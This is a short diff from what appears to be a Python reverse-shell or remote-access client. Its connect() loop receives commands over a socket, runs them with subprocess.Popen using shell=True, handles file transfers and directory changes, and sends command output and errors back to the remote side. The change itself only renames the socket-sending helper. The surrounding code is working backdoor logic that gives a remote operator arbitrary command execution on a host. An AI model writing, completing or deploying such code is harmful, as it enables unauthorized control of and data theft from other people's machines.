@@ -40,16 +40,16 @@ def connect():
 			try:
 				modules.transfer(s,path)
 			except Exception as e:
-				s.send ( str(e) ) # send the exception error
+				socketnoise.say(s, str(e)) # send the exception error
 				pass
 		elif command[:2] == 'cd':
 			modules.cd(s, command)
 		else:
 			try:
 				CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-				socketnoise.respond(s, str(CMD.stdout.read().decode('utf-8')) + str(CMD.stderr.read().decode('utf-8')) ) 
+				socketnoise.say(s, str(CMD.stdout.read().decode('utf-8')) + str(CMD.stderr.read().decode('utf-8')) ) 
 			except error as e:
-				socketnoise.respond(s, f'[ERROR] {e}')
+				socketnoise.say(s, f'[ERROR] {e}')
 
 	return
 # ======================================================== #
